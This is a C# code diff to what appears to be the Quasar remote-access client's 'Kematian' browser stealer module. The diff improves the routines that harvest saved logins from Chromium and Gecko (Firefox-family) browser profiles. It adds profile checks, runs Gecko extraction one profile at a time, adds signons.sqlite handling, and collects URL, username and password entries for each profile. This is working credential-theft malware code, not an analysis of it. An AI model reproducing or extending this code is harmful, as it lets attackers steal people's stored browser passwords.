@@ -355,33 +355,52 @@ namespace Quasar.Client.Kematian.Browsers
                 {
                     foreach (var profile in browser.Profiles)
                     {
+                        if (profile.LoginData == null || !File.Exists(profile.LoginData) || string.IsNullOrEmpty(browser.LocalStatePath))
+                            continue;
+
                         passwordTasks.Add(Task.Run(() => GetChromiumPasswordsForProfile(profile, browser.LocalStatePath)));
                     }
                 }
 
-                // Process Gecko browsers
-                var geckoPasswordTasks = new List<Task<List<Dictionary<string, string>>>>();
+                // Wait for all Chromium tasks to complete
+                if (passwordTasks.Count > 0)
+                {
+                    Task.WaitAll(passwordTasks.ToArray());
+
+                    // Collect Chromium results
+                    foreach (var task in passwordTasks)
+                    {
+                        if (task != null && task.Result != null)
+                        {
+                            allPasswords.AddRange(task.Result);
+                        }
+                    }
+                }
+
+                // Process Gecko browsers sequentially to avoid decryption conflicts
                 foreach (var browser in _geckoBrowsers)
                 {
                     foreach (var profile in browser.Profiles)
                     {
-                        geckoPasswordTasks.Add(Task.Run(() => GetGeckoPasswordsForProfile(profile)));
+                        if (profile.Path == null || !Directory.Exists(profile.Path))
+                            continue;
+
+                        // Process each Gecko profile sequentially
+                        List<Dictionary<string, string>> geckoPasswords = null;
+                        try
+                        {
+                            Debug.WriteLine(profile);
+                            geckoPasswords = GetGeckoPasswordsForProfile(profile);
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error processing Gecko passwords for profile {profile.Name}: {ex.Message}");
+                        }
+                        if (geckoPasswords != null)
+                        {
+                            allPasswords.AddRange(geckoPasswords);
+                        }
                     }
-                }
-
-                // Wait for all tasks to complete
-                Task.WaitAll(passwordTasks.ToArray());
-                Task.WaitAll(geckoPasswordTasks.ToArray());
-
-                // Collect all results
-                foreach (var task in passwordTasks)
-                {
-                    allPasswords.AddRange(task.Result);
-                }
-
-                foreach (var task in geckoPasswordTasks)
-                {
-                    allPasswords.AddRange(task.Result);
                 }
 
                 return allPasswords.Count > 1000
@@ -429,13 +448,13 @@ namespace Quasar.Client.Kematian.Browsers
             bool signonsFound = false;
             bool loginsFound = false;
 
-            string[] files = Directory.GetFiles(profile.Path, "signons.sqlite");
-            if (files.Length > 0)
+            string[] signons = Directory.GetFiles(profile.Path, "signons.sqlite");
+            if (signons.Length > 0)
             {
                 signonsFound = true;
             }
 
-            files = Directory.GetFiles(profile.Path, "logins.json");
+            string[] files = Directory.GetFiles(profile.Path, "logins.json");
             if (files.Length > 0)
             {
                 loginsFound = true;
@@ -444,17 +463,17 @@ namespace Quasar.Client.Kematian.Browsers
             if (loginsFound || signonsFound)
             {
                 var geckoLogins = new PasswordsGecko();
-                var passwords = geckoLogins.GetLogins(profile.Path, profile.LoginsJson);
+                var passwords = geckoLogins.GetLogins(profile.Path, profile.LoginsJson, signonsFound ? signons[0] : null);
                 geckoLogins.Dispose();
 
                 foreach (var entry in passwords)
                 {
                     var newEntry = new Dictionary<string, string>
-                            {
-                            {"Url", entry.Url},
-                            {"Username", entry.Username},
-                            {"Password", entry.Password}
-                            };
+                    {
+                        {"Url", entry.Url},
+                        {"Username", entry.Username},
+                        {"Password", entry.Password}
+                    };
                     result.Add(newEntry);
                 }
             }
